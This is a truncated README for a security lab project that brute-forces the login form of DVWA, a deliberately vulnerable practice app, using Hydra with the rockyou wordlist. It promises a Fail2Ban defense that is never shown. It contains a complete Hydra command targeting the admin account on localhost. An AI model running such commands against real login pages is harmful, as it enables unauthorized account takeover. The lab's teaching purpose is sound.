
# DVWA Brute Force + Fail2Ban Defense

This project demonstrates a common real-world attack—**brute-forcing a web login page using Hydra**—and a basic blue team defense using **Fail2Ban** to detect and prevent it.

---

## 🔴 Offense: Brute-Force with Hydra

**Tools used:**  
- Kali Linux  
- Hydra  
- DVWA (Damn Vulnerable Web App)

**Attack goal:**  
Crack weak passwords on DVWA's login form using a wordlist attack with Hydra.

**Hydra command used:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Login failed"
